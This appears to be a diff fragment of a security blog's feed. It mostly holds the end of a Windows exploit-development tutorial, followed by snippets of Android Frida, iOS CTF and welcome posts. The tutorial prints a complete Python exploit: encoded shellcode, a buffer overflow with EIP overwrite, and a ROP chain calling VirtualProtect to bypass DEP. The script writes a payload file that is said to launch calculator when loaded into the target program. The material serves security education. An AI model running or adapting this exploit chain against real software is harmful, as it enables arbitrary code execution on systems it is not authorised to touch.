+&lt;span class=&quot;nf&quot;&gt;JMP&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;DS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;EAX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;pointer&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Using this information our final payload will be:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-py&quot; data-lang=&quot;py&quot;&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;#badchar 00 0a 0d 2f
+&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xb8\x52\x06\xae\xde\xdb\xc8\xd9\x74\x24\xf4\x5d\x31\xc9\xb1&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x31\x31\x45\x13\x83\xc5\x04\x03\x45\x5d\xe4\x5b\x22\x89\x6a&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xa3\xdb\x49\x0b\x2d\x3e\x78\x0b\x49\x4a\x2a\xbb\x19\x1e\xc6&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x30\x4f\x8b\x5d\x34\x58\xbc\xd6\xf3\xbe\xf3\xe7\xa8\x83\x92&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x6b\xb3\xd7\x74\x52\x7c\x2a\x74\x93\x61\xc7\x24\x4c\xed\x7a&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xd9\xf9\xbb\x46\x52\xb1\x2a\xcf\x87\x01\x4c\xfe\x19\x1a\x17&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x20\x9b\xcf\x23\x69\x83\x0c\x09\x23\x38\xe6\xe5\xb2\xe8\x37&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x05\x18\xd5\xf8\xf4\x60\x11\x3e\xe7\x16\x6b\x3d\x9a\x20\xa8&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x3c\x40\xa4\x2b\xe6\x03\x1e\x90\x17\xc7\xf9\x53\x1b\xac\x8e&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x3c\x3f\x33\x42\x37\x3b\xb8\x65\x98\xca\xfa\x41\x3c\x97\x59&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xeb\x65\x7d\x0f\x14\x75\xde\xf0\xb0\xfd\xf2\xe5\xc8\x5f\x98&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xf8\x5f\xda\xee\xfb\x5f\xe5\x5e\x94\x6e\x6e\x31\xe3\x6e\xa5&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x76\x1b\x25\xe4\xde\xb4\xe0\x7c\x63\xd9\x12\xab\xa7\xe4\x90&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x5e\x57\x13\x88\x2a\x52\x5f\x0e\xc6\x2e\xf0\xfb\xe8\x9d\xf1&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x29\x8b\x40\x62\xb1\x62\xe7\x02\x50\x7b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;padding&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;207&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;eip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x10013e29&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;junk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;B&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;junk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x61e85f7a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;padding&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;junk&lt;/span&gt; 
+&lt;span class=&quot;c1&quot;&gt;#EBP
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x61e85f79&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x61e85f79&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#EBX
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x61e05f4f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xfffffdff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x7c353c73&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x100191c1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xffffffff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x61e0579d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x100186d1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#EDX
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x7c3458e1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xffffffc0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x7c351eb1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#ECX
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x7c369e4c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x7c38c777&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#EDI
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1001946a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1001946b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#ESI
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1002015a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x7c3415a2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#EAX
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x7c348495&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x61e9b30c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#pushad
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x10019094&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#pushad, RETN
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x100102a2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#push esp, RETN -&amp;gt; this will execute place the instruction to the top of the stack, to start executing the virtualprotect() function.
+&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;payload.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;wb&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[*] payload.txt is ready&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Running this script will create a payload.txt file and when you upload it to the program, it will execute calculator.&lt;/p&gt;
+
+&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;http://localhost:4000/blog/img/windows_exploit_dev_1/windows_exp13.png&quot; alt=&quot;PLIST-FILE_3&quot; /&gt;&lt;/p&gt;
+
+&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;http://localhost:4000/blog/img/windows_exploit_dev_1/windows_exp14.png&quot; alt=&quot;PLIST-FILE_3&quot; height=&quot;300px&quot; width=&quot;300px&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Cool! so in this post we will look on how to bypass ASLR and DEP protection in windows 7 by elevating ROP in our exploit. I hope you enjoy this post and take care.&lt;/p&gt;</content><author><name></name></author><category term="Windows_Exploit_Development" /><summary type="html">Hello world!</summary></entry><entry><title type="html">Android Application Security [chapter 0x1] - Introduction to Frida</title><link href="http://localhost:4000/blog/android_application_security/2021/03/25/android_application_security_chapter_0x1.html" rel="alternate" type="text/html" title="Android Application Security [chapter 0x1] - Introduction to Frida" /><published>2021-03-25T10:44:25+07:00</published><updated>2021-03-25T10:44:25+07:00</updated><id>http://localhost:4000/blog/android_application_security/2021/03/25/android_application_security_chapter_0x1</id><content type="html" xml:base="http://localhost:4000/blog/android_application_security/2021/03/25/android_application_security_chapter_0x1.html">&lt;p&gt;Hello world!&lt;/p&gt;
 
 &lt;p&gt;Hi everyone this will be an introduction on how to utilized dynamic analysis tools frida in Android. This post will go through on how to setup frida in rooted android and how to used it to make application bend to our will.&lt;/p&gt;
 
@@ -1058,7 +1342,7 @@ hello world!&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 &lt;p&gt;Finally, we got the last flag!&lt;/p&gt;
 
-&lt;p&gt;That’s all folks! I hope you enjoy this post and see you in the next one.&lt;/p&gt;</content><author><name></name></author><category term="IOS_Security_Tutorial" /><summary type="html">Hello world!</summary></entry><entry><title type="html">Welcome to MobAppSec-Blog!</title><link href="http://localhost:4000/blog/food_for_thought/2020/12/03/hello_world.html" rel="alternate" type="text/html" title="Welcome to MobAppSec-Blog!" /><published>2020-12-03T14:44:25+07:00</published><updated>2020-12-03T14:44:25+07:00</updated><id>http://localhost:4000/blog/food_for_thought/2020/12/03/hello_world</id><content type="html" xml:base="http://localhost:4000/blog/food_for_thought/2020/12/03/hello_world.html">&lt;p&gt;Hello world! For my first post, I think it’s a good idea to introduce this blog and what kinda content that will be released for now and for the future. Little bit of myself, My name is williams from Indonesia and I currently work as independent security consultant(Mostly doing Mobile Application Penetration Testing). I create this blog to share what I thought to be interesting and useful for doing real life mobile application security testing and also this blog would be indirectly used as a cheatsheet of mine if I ever forget some POC that I have done earlier, mostly this blog will cover about mobile application security, this include:&lt;/p&gt;
